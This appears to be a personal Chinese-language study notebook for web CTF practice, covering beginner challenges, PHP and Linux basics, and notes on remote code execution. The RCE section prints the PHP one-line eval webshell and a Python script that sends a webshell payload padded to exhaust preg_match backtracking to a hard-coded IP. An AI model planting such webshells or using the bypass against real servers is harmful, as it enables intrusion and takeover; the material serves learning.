# 工具安装
HackBar

![69f6aaf9fc924c9decab4f8dd38a6ae8](https://github.com/user-attachments/assets/299e710c-5aba-4e67-82f4-1faf55bd532c)

BurpSuite

![QQ_1741861291613](https://github.com/user-attachments/assets/75d54315-e541-4694-ab38-a4505b859d9a)

Dirsearch & SQLmap & Typora & git

![](https://github.com/user-attachments/assets/0383d67a-eb5e-4978-b133-28b90830fd3a)

![QQ_1741860782970](https://github.com/user-attachments/assets/0c0bfe2d-33ff-4bed-9780-6820e3e86fed)

# 攻防世界基础题单
## view_source
获取在线场景，进入场景后，在firefox中摁下F12，通过查看器可以找到flag。

![](https://github.com/user-attachments/assets/c36eca5a-59b7-4f2f-8832-f4d405186ab3)

## get_post

GET 是最常见的 HTTP 方法之一。用 GET 给后端传参的方法是：在?后跟变量名字，不同的变量之间用&隔开，在url后添加/?a=1 即可发送get请求。

![142033240e726ea4421473bb459034e6](https://github.com/user-attachments/assets/4dde11ed-b55c-4fcf-a334-63431c39d053)

POST 用于将数据发送到服务器来创建/更新资源。

在hackbar中进行 POST 传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST 请求，便可获得flag。

![c93338977e8d9569ffe2bc2c74de8faf](https://github.com/user-attachments/assets/05043a46-700a-49d6-8bf9-0b00a17632ea)

## robots

Robots 协议（也称为爬虫协议、机器人协议等）是网站与爬虫之间的一种默契约定，用于指导爬虫哪些页面可以抓取，哪些不可以抓取，从而保护网站的数据隐私、性能以及避免过度抓取对服务器造成负担。其本质是一个放置在网站根目录下的文本文件（通常命名为 robots.txt），里面包含了一系列规则，告诉搜索引擎爬虫或其他网络爬虫在抓取网站页面时应遵循的指令。

![QQ_1741859693664](https://github.com/user-attachments/assets/b018faa7-c612-4cc6-af05-10dd05607fe4)

先调用查看器访问源代码，没有发现flag，访问 robots 文件，在网址后添加robots.txt，找到有关 flag 的 php 文件。

![6f468e704a452ddd3933db6e4e4af7ca](https://github.com/user-attachments/assets/0e989289-c7b6-40a0-98a1-58a0fd4af76d)

访问 flag_is_h3re.php，成功找到flag。

![112071e5c546019f2b3ec1e924513a2f](https://github.com/user-attachments/assets/6305d370-bdd5-434d-8c6f-34e5161fac45)

# 项目隐藏flag
直接看README.md文件源代码可以找到 flag{we1c0me_t0_CTF!}

![3e25593536b4b1868cb42680703d4158](https://github.com/user-attachments/assets/b7597c5b-6f4f-42d0-87c9-a5e4d83899b3)

# python脚本（DeepSeek）
```
import hashlib

def find_md5_prefix(target_prefix):
    num = 0
    while True:
        candidate = str(num).encode()
        hash_hex = hashlib.md5(candidate).hexdigest()
        if hash_hex.startswith(target_prefix):
            return candidate.decode()
        num += 1

if __name__ == "__main__":
    target = '19ca14'
    result = find_md5_prefix(target)
    print(f"找到的值: {result}")
```

# PHP
## 写的第一段PHP代码
```
<!DOCTYPE html>
<html>
<body>
<h1>Welcome to Jatopos</h1>

<?php
echo "Hello CTF!";
?>

</body>
</html>
```

## HTML
超文本标记语言,是一种用于创建网页的标准标记语言。
后缀名 .html .htm
html标签，通常成对出现
```
<!DOCTYPE html> 声明为 HTML5 文档，不区分大小写
<html> 元素是 HTML 页面的根元素
<head> 元素包含了文档的元（meta）数据，如 <meta charset="utf-8"> 定义网页编码格式为 utf-8，否则会出现乱码。
<title> 元素描述了文档的标题
<body> 元素包含了可见的页面内容
<h1> 元素定义一个大标题
<p> 元素定义一个段落
<br>换行符
Web浏览器（如谷歌浏览器，Internet Explorer，Firefox，Safari）是用于读取HTML文件，并将其作为网页显示。
<a>定义链接
<img>定义图像
```

## PHP语法笔记
PHP是超文本预处理器。是运行在服务端的开源语言，它可以让Web开发人员快速的书写生成动态的页面。--*PHP是最好的语言！*

echo：输出

print：输出内容，输出成功后打印1

print_r：输出数组，打印变量

var_dump：输出数据的详细信息，带有数据类型，数据长度

*< !DOCTYPE html >*：声明文档遵循HTML5标准，必须出现在文档第一行，不是HTML标签

*< html >*：定义整个HTML文档的根元素，包裹所有网页内容

*< body >*：包含网页可见内容的主体部分（文本、图片、视频等）

*< h1 > < /h1 >*：显示最大的一级标题

*< ?php ... ? >*：PHP代码标识符
执行流程：
服务器解析PHP代码
执行echo语句输出内容
将结果嵌入HTML发送给客户端
安全特性：客户端无法看到原始PHP代码

*echo*：输出指定字符串到HTML中

PHP数据类型：整数型、浮点型、布尔型、字符串型

PHP变量必须以 $ 开头，区分大小写
unset() 来删除变量，销毁变量名。
isset() 用来检查变量是否被设置并且是否为空。

define(常量名,值) 定义变量

与其它语言不同的运算符：

== 比较值

=== 全等于，左边与右边相同：（大小以及数据的类型都要相同）

!== 不全等于，只有大小或者类型不同

@ 错误抑制符

超文本预处理器,是一种通用开源脚本语言。
- PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码
- PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器
- PHP 文件的默认文件扩展名是 .php
phpstudy+phpstorm

以 <?php 开始，以 ?> 结束
. PHP_EOL 换行符
echo 、print 输出
PHP变量以 $ 符号开始，后面跟着变量的名称
如
$x=5;
$y=6;
$z=$x+$y;
echo $z;
弱类型语言不必声明类型，数字直接赋值，字符需要加引号
global 关键字用于函数内访问全局变量
unset() 来删除变量，销毁变量名。
isset() 用来检查变量是否被设置并且是否为空。

EOF用法 允许你在字符串中包含多行文本，而无需逐行拼接或使用转义字符。
<?php
echo <<<EOF
        <h1>我的第一个标题</h1>
        <p>我的第一个段落。</p>
EOF;
// 结束需要独立一行且前后不能空格
?>

字符串 整型 浮点型 布尔型 数组 
var_dump() 函数返回变量的数据类型和值
例如
```
<?php 
$cars=array("Volvo","BMW","Toyota");
var_dump($cars);
?>

array(3) { [0]=> string(5) "Volvo" [1]=> string(3) "BMW" [2]=> string(6) "Toyota" }
```

php对象（类似于c的struct）
使用class关键字声明类对象。类是可以包含属性和方法的结构。然后我们在类中定义数据类型，然后在实例化的类中使用数据类型
类的变量使用 var 来声明, 变量也可以初始化值（创建）
类创建后，我们可以使用 new 运算符来实例化该类的对象（添加）
函数 function 将实现某一功能的代码块封装到一个结构中，实现代码复用（类似于void定义函数）函数可以在定义之前使用
调用成员使用->
封装、继承、多态（同一个方法，传入不同的对象，实现不同的效果）
```
<?php
class Car
{
  var $color;
  function __construct($color="green") {
    $this->color = $color;
  }
  function what_color() {
    return $this->color;
  }
}
?>
```
this就是指向当前对象实例的指针，不指向任何其他对象或类

PHP 资源
resource 是一种特殊变量，保存了到外部资源的一个引用。常见资源数据类型有打开文件、数据库连接、图形画布区域等。
get_resource_type() 函数可以返回资源类型，如
```
<?php
$c = mysql_connect();
echo get_resource_type($c)."\n";
// 打印：mysql link

$fp = fopen("foo","w");
echo get_resource_type($fp)."\n";
// 打印：file

$doc = new_xmldoc("1.0");
echo get_resource_type($doc->doc)."\n";
// 打印：domxml document
?>
```


常量可以用 define() 函数或 const 关键字来定义。
```
bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
```
- name：必选参数，常量名称，即标志符。
- value：必选参数，常量的值。
- case_insensitive ：false 大小写敏感。
常量是全局的
```
<?php
// 不区分大小写的常量名
define("GREETING", "欢迎访问 Runoob.com", true);
echo greeting;  // 输出 "欢迎访问 Runoob.com"
?>

const SITE_URL = "https://www.runoob.com";
echo SITE_URL; // 输出 "https://www.runoob.com"
```
使用常量时，不能在常量名前添加$ 符号，不然会将常量转换成新的未定义变量使用，会导致报错。
预定义常量、常量数组

php字符串
将两个字符串变量连接在一起：echo $txt1 . " " . $txt2;
Hello world! What a nice day!（中间有一个空格）
strlen() 函数返回字符串的长度
```
echo strlen("Hello world!");  12
```
strpos() 函数用于在字符串内查找一个字符或一段指定的文本
```
echo strpos("Hello world!","world"); 6
```

PHP 算术运算符（大部分同c）
~x 取反  ~1=-2; ~0=-1;
a.b 并置 连接两个字符串
intdiv()，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整）
a .=b 相当于a=a . b
== 比较，只比较值，不比较类型。
=== 比较，除了比较值，也比较类型。
0 == false: bool(true)
0 === false: bool(false)
"" == false: bool(true)
"" === false: bool(false)

x<>y 判断是否不等于（相当于!=）
x  !== y 不绝对等于
x xor y 异或 有且仅有一个为true
＆＆相当于and
|| 相当于or

问号（?）是三元运算符
条件 ? 表达式1 : 表达式2
若条件为真，执行表达式1；
若条件为假，执行表达式2。

<=>是组合比较符
可以轻松实现两个变量的比较

$c = $a <=> $b;
如果 $a > $b, 则 $c 的值为 1。
如果 $a == $b, 则 $c 的值为 0。
如果 $a < $b, 则 $c 的值为 -1。

PHP If...Else 语句


isset() 函数
用于检测变量是否已设置并且非 NULL，对数组也有效
```
bool isset ( mixed $var [, mixed $... ] )
```
- $var：要检测的变量。
```
if (isset($var)) {
    echo "变量已设置。" . PHP_EOL;
}

$a = "test";
$b = "anothertest";
 
var_dump(isset($a));      // TRUE
var_dump(isset($a, $b)); // TRUE
 
unset ($a);
 
var_dump(isset($a));     // FALSE
var_dump(isset($a, $b)); // FALSE
 
$foo = NULL;
var_dump(isset($foo));   // FALSE
?>
```

PHP的笔记后面会继续补上⁽˙³˙⁾

## RCE语法笔记
前置知识
Linux
一种开源的操作系统，兼具图形界面操作和完全的命令行操作，可以使用键盘完成一切操作效率高，系统稳定性高，远程管理方便
由Linux内核、GNU工具、图形化桌面环境、应用软件构成
内核控制硬件与软件
GNU系统工具链执行标准功能
Linux常用命令
1. ls  ：列出⽬录内容
ls  ：列出当前⽬录的⽂件和⽂件夹。 
ls -l  ：以详细列表形式显⽰。
ls -a  ：显⽰所有⽂件，包括隐藏⽂件。
1、/ 代表根目录 ls /
2、. 当前目录
3、.. 上级目录
4、~ 当前用户的默认工作目录
2.  cd ：切换⽬录
cd  ⽬录名：进⼊指定⽬录。
cd ..  ：返回上⼀级⽬录。
cd ~  ：回到⽤⼾的主⽬录。
3. pwd ：显⽰当前所在⽬录
4. mkdir  ：创建⽬录
mkdir  ⽬录名 ：创建⼀个新的⽬录。
5. rmdir  ：删除空⽬录
rmdir  ⽬录名 ：删除⼀个空的⽬录。
6.  rm ：删除⽂件或⽬录
 rm  ⽂件名：删除⽂件。
 rm -r  ⽬录名：递归删除⽬录及其内容（谨慎使⽤）。
7.  cp ：复制⽂件或⽬录
cp  源⽂件   ⽬标⽂件：复制⽂件。
cp -r  源⽬录   ⽬标⽬录：复制⽬录。
8. mv ：移动或重命名⽂件或⽬录
mv  源⽂件   ⽬标⽂件：重命名⽂件。
mv  源⽂件   ⽬标⽬录：移动⽂件到⽬标⽬录。
9.  cat ：查看⽂件内容
10. man  ：查看命令帮助
man  命令名 ：查看该命令的详细使⽤⼿册。
11. vi/vim:⽂本编辑器
史上最全的Linux常用命令汇总(超全面!超详细!)收藏这一篇就够了!_linux命令汇总-CSDN博客
10分钟让你掌握Linux常用命令(+3万+++收藏)_在线linux 命令-CSDN博客

常用技巧
文件查看命令
1. cat
  - 描述：连接文件并一次性显示全部内容。
  - 常用选项：
    - cat filename：显示文件内容。
    - cat -n filename：显示内容并添加行号。
    - cat file1 file2：合并显示多个文件内容。
2. more
  - 描述：分页显示文件内容，仅支持向下翻页。
  - 操作：按空格键向下翻页，按q退出。
3. less
  - 描述：增强版分页工具，支持上下翻页和搜索。
  - 操作：
    - 上下翻页：Page Up/Page Down。
    - 搜索：输入/keyword，按n跳转到下一个匹配项。
    - 退出：按q。
  - 推荐：优先使用less替代more。
4. head
  - 描述：显示文件前几行（默认前10行）。
  - 常用选项：
    - head filename：显示前10行。
    - head -n 20 filename：显示前20行。
5. tail
  - 描述：显示文件后几行（默认后10行），支持实时跟踪文件更新。
  - 常用选项：
    - tail filename：显示后10行。
    - tail -n 20 filename：显示后20行。
    - tail -f filename：实时跟踪文件尾部（如日志文件）。
6. tac
  - 描述：反向显示文件内容（从最后一行到第一行），是cat的逆序版本。
7. nl
  - 描述：显示文件内容并添加行号，功能类似cat -n。
8. od
  - 描述：以特定编码格式（如十六进制、八进制）查看文件，适用于二进制文件。
  - 常用选项：
    - od -x filename：以十六进制显示。
    - od -b filename：以八进制显示。
文本处理命令
1. sort
  - 描述：对文件内容进行排序后输出。
  - 常用选项：
    - sort filename：按字母顺序排序文件内容。
2. uniq
  - 描述：去除文件中的重复行，需与sort配合使用。
  - 常用选项：
    - sort filename | uniq：先排序文件内容，再去除重复行。
文件检测命令
1. file
  - 描述：检测文件类型（如文本、二进制、压缩文件等）。
  - 常用选项：
    - file filename：显示文件类型。
    - file -f filelist：从指定文件中读取文件名列表并逐个检测类型；若文件不存在或无法访问，会明确报错。


Docker
开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可抑制的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化。沙盒机制，虚拟技术阻止恶意行为。不依赖于任何语言、框架或者包装系统。

什么是RCE
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE主要指远程代码执行和远程命令执行。
（RCE代码执行）
php、java、python
危害：执行脚本代码

RCE命令执行
linux、windows
危害：执行系统命令

命令执行函数
运行、运行条件、参数、回显

eval()函数
它可以将⼀个字符串当作PHP代码来执⾏。这个功能⾮常强⼤，但也⾮常危险，如果使⽤不当，可能会导致严重的安全问题。
```
eval ( string $code ) : mixed
```
eval()  函数会将 $code  字符串中的内容解析为PHP代码，并执⾏它。执⾏的代码会继承 eval()  函数所在⾏的变量作⽤域。也就是说，在 eval()  中可以访问和修改 eval()  函数外部的变量。
```
<?php
$string = "beautiful";
$time = "winter";
 
$str = 'This is a $string $time morning!';
echo $str. PHP_EOL;
 
eval("\$str = \"$str\";");
echo $str;
?>


输出
This is a $string $time morning!
This is a beautiful winter morning!
```

system()
```
system(string $command,int &$return_var=?)
```

command:执行command参数指定命令，输出执行结果（可以直接回显）
system('ls /') 这将会列出根⽬录（/ ）下的所有⽂件和⽬录。
return_var 返回状态（可选） 0成功 1失败

passthru
执⾏外部程序并且显⽰原始输出 
类似于system，特殊情况是处理图片数据流时只能用passthru
```
passthru(string $command, int &$result_code = null): ?false
```

exec()
```
exec(string $command, array &$output = null, int &$result_code = null): string|false
```

exec() 执行 command 参数所指定的命令。只能回显最后一行
如果提供了 output 参数， 那么会用命令执行的输出填充此数组
使用output参数+echo可以回显全部内容
不显示输出：exec()  本⾝不会将命令输出打印到屏幕上。如果需要显⽰输出，可以使⽤ echo等函数处理 $output 数组。

shell_exec()
通过 shell 执行命令并将完整的输出以字符串的方式返回
shell_exec(string $command): string|false|null

<?php
```
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";
?>
```

执行运算符：
PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 shell_exec() 相同。
```
<?php
$output = `ls -al`;
echo "<pre>$output</pre>";
?>
```

var_dump()
主要⽤于输出变量的详细信息，包括变量的类 型和值。它在调试代码和分析变量状态时⾮常有⽤。

pcntl_exec()
⽤于在当前进程空间执⾏指定的程序,不会创建新的⼦进程⽽是替换当前进程。这意味着调⽤pcntl_exec() 之后，原来的PHP脚本将停⽌执⾏，取 ⽽代之的是执⾏指定的程序。
```
 bool pcntl_exec ( string $path [, array $args [, array $envs ]] )

<?php

//执行ls命令，列出当前⽬录的⽂件
pcntl_exec("/bin/ls", ["-l"]);

//如果pcntl_exec执⾏成功，以下代码不会被执⾏
echo "This line will not be printed.\n";
  
?>  
```

![image](https://github.com/user-attachments/assets/414692be-6515-406a-bcf1-a969154295d4)


popen()
打开进程文件指针


一句话木马
⼀句话⽊⻢是⼀种简短的恶意代码，通常⽤于在⽬标服务器上创建⼀个后⻔，以便攻击者远程控制该 服务器或执⾏其他恶意操作。它主要出现在Web安全领域，特别是涉及PHP、ASP、JSP等动态语⾔ 的Web应⽤程序中。
```
php 的⼀句话⽊⻢：<?php @eval($_POST['a']); ?>
```

preg_match绕过总结
1、数组绕过
preg_match只能处理字符串，当传入的subject是数组时会返回false
2、PCRE回溯次数限制
pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false
[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
```
import requests
from io import BytesIO

files = {
  'file': BytesIO(b'aaa<?php eval($_POST[txt]);//' + b'a' * 1000000)
}

res = requests.post('http://51.158.75.42:8088/index.php', files=files, allow_redirects=False)
print(res.headers)
```

3、换行符
特殊字符（点，句号)在正则表达式中用来表示除了‘新行’之外的所有字符。所以模式 ∧∧ 5$ 与任何两个字符的、以数字5结尾和以其他非‘新行’字符开头的字符串匹配。模式 ∧∧ 可以匹配任何字符串，换行符（\n, \r）除外
![image](https://github.com/user-attachments/assets/426de3d6-3902-41c6-b213-3148275619b9)

4、Base64、URL编码绕过
Base64 编码是⼀种基于64个可打印字符来表⽰⼆进制数据的编码⽅式。它常⽤于在需要以⽂本形 式传输或存储⼆进制数据的场景中，⽐如电⼦邮件、URL参数、⽹络传输等。
Base64使⽤以下64个字符作为编码表：
字⺟： A-Z 、 a-z  （共52个字符）
数字： 0-9 （共10个字符） 
两个符号： + 和 / （共2个字符） 
填充符： = （⽤于填充不⾜3字节的数据）
3个字符（24位）才够转换为4个6位的分组
![image](https://github.com/user-attachments/assets/206034da-70e3-4d11-bdc1-50f49e9fcfe0)


![image](https://github.com/user-attachments/assets/91c859e1-857d-4fd2-9dca-38c961a3b8d1)

![image](https://github.com/user-attachments/assets/f65fe625-2a92-400e-b6d1-4d152ce611da)

根据base64解码规则和php中base64解码宽松性，= 在解码过程开始前会被移除，所以不会影响解码结果，但是+号作为码表的一部分移除会导致解码不正确，注意分别。
可以用get：/?wrappers=;base64,编码

